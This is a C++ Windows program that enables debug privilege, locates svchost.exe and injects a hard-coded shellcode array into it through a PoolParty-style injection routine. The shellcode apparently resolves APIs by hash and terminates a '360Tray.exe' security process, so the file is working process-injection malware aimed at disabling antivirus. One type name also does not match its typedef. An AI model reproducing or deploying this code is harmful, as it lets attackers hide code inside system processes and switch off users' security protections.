#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>
#include "PoolParty.h"
using namespace std;

typedef int(__stdcall* FN_RtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
DWORD findProcess();
BOOL enablePrivilege();

unsigned char shellcode[580] = {
    0x48, 0x83, 0xEC, 0x28, 0xE8, 0x23, 0x01, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0x48, 0x8B, 0xC4, 0x48,
    0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41,
    0x56, 0x41, 0x57, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x44, 0x8B, 0xF9, 0x48,
    0x8B, 0x50, 0x18, 0x4C, 0x8B, 0x72, 0x20, 0x4D, 0x8B, 0xC6, 0x4D, 0x8B, 0x48, 0x20, 0x4D, 0x8B,
    0x00, 0x4D, 0x85, 0xC9, 0x0F, 0x84, 0x9F, 0x00, 0x00, 0x00, 0x49, 0x63, 0x41, 0x3C, 0x42, 0x8B,
    0x8C, 0x08, 0x88, 0x00, 0x00, 0x00, 0x85, 0xC9, 0x0F, 0x84, 0x8B, 0x00, 0x00, 0x00, 0x4D, 0x8D,
    0x14, 0x09, 0x33, 0xFF, 0x41, 0x8B, 0x52, 0x0C, 0x49, 0x03, 0xD1, 0x44, 0x8A, 0x1A, 0x45, 0x84,
    0xDB, 0x74, 0x21, 0x41, 0x8A, 0xC3, 0x0F, 0xBE, 0xC8, 0xC1, 0xCF, 0x0D, 0x41, 0x80, 0xFB, 0x61,
    0x8D, 0x41, 0xE0, 0x0F, 0x4C, 0xC1, 0x48, 0xFF, 0xC2, 0x03, 0xF8, 0x8A, 0x02, 0x44, 0x8A, 0xD8,
    0x84, 0xC0, 0x75, 0xE2, 0x41, 0x8B, 0x52, 0x20, 0x45, 0x33, 0xDB, 0x49, 0x03, 0xD1, 0x45, 0x39,
    0x5A, 0x18, 0x76, 0x45, 0x8B, 0x1A, 0x33, 0xF6, 0x49, 0x03, 0xD9, 0x40, 0x8A, 0x2B, 0x40, 0x84,
    0xED, 0x74, 0x21, 0x40, 0x8A, 0xC5, 0x0F, 0xBE, 0xC8, 0xC1, 0xCE, 0x0D, 0x40, 0x80, 0xFD, 0x61,
    0x8D, 0x41, 0xE0, 0x0F, 0x4C, 0xC1, 0x48, 0xFF, 0xC3, 0x03, 0xF0, 0x8A, 0x03, 0x40, 0x8A, 0xE8,
    0x84, 0xC0, 0x75, 0xE2, 0x8D, 0x04, 0x3E, 0x44, 0x3B, 0xF8, 0x74, 0x31, 0x41, 0xFF, 0xC3, 0x48,
    0x83, 0xC2, 0x04, 0x45, 0x3B, 0x5A, 0x18, 0x72, 0xBB, 0x4D, 0x3B, 0xC6, 0x0F, 0x85, 0x48, 0xFF,
    0xFF, 0xFF, 0x33, 0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x18, 0x48, 0x8B, 0x6C, 0x24, 0x20, 0x48, 0x8B,
    0x74, 0x24, 0x28, 0x48, 0x8B, 0x7C, 0x24, 0x30, 0x41, 0x5F, 0x41, 0x5E, 0xC3, 0x41, 0x8B, 0x4A,
    0x24, 0x49, 0x03, 0xC9, 0x46, 0x0F, 0xB7, 0x04, 0x59, 0x41, 0x8B, 0x4A, 0x1C, 0x49, 0x03, 0xC9,
    0x42, 0x8B, 0x04, 0x81, 0x49, 0x03, 0xC1, 0xEB, 0xCB, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x5C, 0x24,
    0x18, 0x55, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8D, 0x6C, 0x24,
    0xA0, 0x48, 0x81, 0xEC, 0x60, 0x01, 0x00, 0x00, 0xB9, 0x46, 0xDF, 0x8D, 0xF8, 0xE8, 0xBA, 0xFE,
    0xFF, 0xFF, 0xB9, 0xA7, 0x0B, 0x59, 0x08, 0x4C, 0x8B, 0xE8, 0xE8, 0xAD, 0xFE, 0xFF, 0xFF, 0xB9,
    0x95, 0x76, 0x34, 0x3F, 0x48, 0x89, 0x85, 0xA0, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xD8, 0xE8, 0x99,
    0xFE, 0xFF, 0xFF, 0xB9, 0x39, 0x23, 0xE1, 0x93, 0x48, 0x89, 0x85, 0xA8, 0x00, 0x00, 0x00, 0xE8,
    0x88, 0xFE, 0xFF, 0xFF, 0xB9, 0xF1, 0x55, 0xA6, 0x1C, 0x4C, 0x8B, 0xF0, 0xE8, 0x7B, 0xFE, 0xFF,
    0xFF, 0xB9, 0xA7, 0x55, 0x0B, 0xFD, 0x48, 0x8B, 0xF0, 0xE8, 0x6E, 0xFE, 0xFF, 0xFF, 0xB9, 0x62,
    0xF5, 0x9D, 0x75, 0x4C, 0x8B, 0xF8, 0xE8, 0x61, 0xFE, 0xFF, 0xFF, 0xB9, 0x42, 0x07, 0xFD, 0xF7,
    0x4C, 0x8B, 0xE0, 0xE8, 0x54, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0xF8, 0xC7, 0x44, 0x24, 0x20, 0x33,
    0x36, 0x30, 0x54, 0xC7, 0x44, 0x24, 0x24, 0x72, 0x61, 0x79, 0x2E, 0xC7, 0x44, 0x24, 0x28, 0x65,
    0x78, 0x65, 0x00, 0xB9, 0xB8, 0x0B, 0x00, 0x00, 0xFF, 0xD3, 0x33, 0xD2, 0x8D, 0x4A, 0x02, 0x41,
    0xFF, 0xD5, 0x48, 0x8D, 0x54, 0x24, 0x30, 0xC7, 0x44, 0x24, 0x30, 0x30, 0x01, 0x00, 0x00, 0x48,
    0x8B, 0xC8, 0x48, 0x8B, 0xD8, 0xFF, 0x95, 0xA8, 0x00, 0x00, 0x00, 0x85, 0xC0, 0x75, 0x16, 0x48,
    0x8B, 0xCB, 0xFF, 0xD6, 0xEB, 0x0F, 0x48, 0x8D, 0x54, 0x24, 0x30, 0x48, 0x8B, 0xCB, 0x41, 0xFF,
    0xD6, 0x85, 0xC0, 0x74, 0x25, 0x48, 0x8D, 0x54, 0x24, 0x20, 0x48, 0x8D, 0x4C, 0x24, 0x5C, 0xFF,
    0xD7, 0x85, 0xC0, 0x75, 0xE1, 0x44, 0x8B, 0x44, 0x24, 0x38, 0x8D, 0x48, 0x01, 0x33, 0xD2, 0x41,
    0xFF, 0xD7, 0x33, 0xD2, 0x48, 0x8B, 0xC8, 0x41, 0xFF, 0xD4, 0x48, 0x8B, 0x9D, 0xA0, 0x00, 0x00,
    0x00, 0xEB, 0x90, 0xCC
};

int main() {
    DWORD dwProcessID = 0;
    HANDLE hProcess = nullptr;
    if (!enablePrivilege()) {
        cout << "EnablePrivilege error" << endl;
        return -1;
    }
    dwProcessID = findProcess();
    if (dwProcessID == -1) {
        cout << "findprocess error" << endl;
        return -1;
    }

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);
    if (hProcess == nullptr) {
        cout << "openprocess error" << endl;
        return -1;
    }

    //inject
    Inject2Process(hProcess, shellcode, 580);
    return 0;
}

DWORD findProcess()
{
    PROCESSENTRY32 proc_entry32 = { 0 };
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);

    proc_entry32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapShot, &proc_entry32)) {
        cout << "error" << endl;
        CloseHandle(hSnapShot);
    }
    do
    {
        if (wcscmp(proc_entry32.szExeFile, L"svchost.exe") == 0) {
            return proc_entry32.th32ProcessID;
        }
    } while (Process32Next(hSnapShot, &proc_entry32));
    return -1;
}

BOOL enablePrivilege()
{
    BOOLEAN ret;
    HMODULE hNtdll;
    TOKEN_PRIVILEGES token_priv;
    FP_RtlAdjustPrivilege _RtlAdjustPrivilege;
    token_priv.PrivilegeCount = 1;

    hNtdll = LoadLibraryA("Ntdll.dll");
    if (hNtdll == nullptr) {
        cout << GetLastError() << endl;
        return FALSE;
    }

    _RtlAdjustPrivilege = (FN_RtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    if (_RtlAdjustPrivilege == nullptr) {
        FreeLibrary(hNtdll);
        cout << GetLastError() << endl;
        return FALSE;
    }

    if (!LookupPrivilegeValueW(nullptr, SE_DEBUG_NAME, &token_priv.Privileges[0].Luid)) {
        FreeLibrary(hNtdll);
        cout << GetLastError() << endl;
        return FALSE;
    }

    _RtlAdjustPrivilege(token_priv.Privileges[0].Luid.LowPart, TRUE, FALSE, &ret);//do not check ret

    return TRUE;
}
